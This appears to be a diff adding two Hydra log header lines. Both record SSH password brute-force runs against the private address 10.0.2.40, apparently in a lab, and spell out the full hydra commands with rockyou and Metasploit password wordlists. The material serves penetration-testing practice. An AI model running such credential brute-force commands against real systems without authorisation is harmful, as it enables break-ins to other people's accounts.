@@ -1,0 +1,2 @@
+# Hydra v9.5 run at 2025-04-04 17:29:38 on 10.0.2.40 ssh (hydra -L /usr/share/wordlists/rockyou.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt -oG -vvv 10.0.2.40 ssh outputSSH.txt)
+# Hydra v9.5 run at 2025-04-04 17:31:48 on 10.0.2.40 ssh (hydra -L /usr/share/wordlists/rockyou.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt -t 2 -w 5 -oG -vvv 10.0.2.40 ssh outputSSH.txt)
